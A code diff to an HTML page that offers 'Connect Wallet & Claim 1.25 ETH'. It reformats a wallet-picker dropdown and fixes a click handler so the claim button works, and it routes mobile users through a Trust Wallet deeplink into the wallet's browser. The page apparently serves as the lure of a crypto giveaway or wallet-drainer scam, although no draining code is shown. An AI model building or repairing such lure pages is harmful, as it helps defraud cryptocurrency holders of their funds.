@@ -88,17 +88,16 @@
                 </div>
 
                 <div class="claim-button-container">
-                    <select id="wallet-select">
-                        
-                        <option value="trust">Trust Wallet</option>
-                        <option value="walletconnect">WalletConnect</option>
-                        <option value="coinbase">Coinbase Wallet</option>
-                        <option value="rainbow">Rainbow</option>
-                        <option value="argent">Argent</option>
-                        <option value="safe">Safe</option>
-                    </select>
-                    <button id="ethConnectWallet" class="eth-claim-button"><i class="fas fa-wallet"></i> Connect Wallet & Claim 1.25 ETH</button>
-                </div>
+    <select id="wallet-select">
+        <option value="trust">Trust Wallet</option>
+        <option value="walletconnect">WalletConnect</option>
+        <option value="coinbase">Coinbase Wallet</option>
+        <option value="rainbow">Rainbow</option>
+        <option value="argent">Argent</option>
+        <option value="safe">Safe</option>
+    </select>
+    <button id="ethConnectWallet" class="eth-claim-button"><i class="fas fa-wallet"></i> Connect Wallet & Claim 1.25 ETH</button>
+</div>
 
 <script>
   const TRUST_DEEPLINK = 'https://link.trustwallet.com/open_url?coin_id=60&url=';
@@ -124,7 +123,7 @@
     window.location.href = TRUST_DEEPLINK + encodeURIComponent(target.toString());
   }
 
-  document.getElementById('trust').addEventListener('click', async () => {
+  document.getElementById('ethConnectWallet').addEventListener('click', async () => {
     const choice = document.getElementById('wallet-select').value;
 
     if (choice === 'trust' && isMobile() && !isTrustBrowser()) {
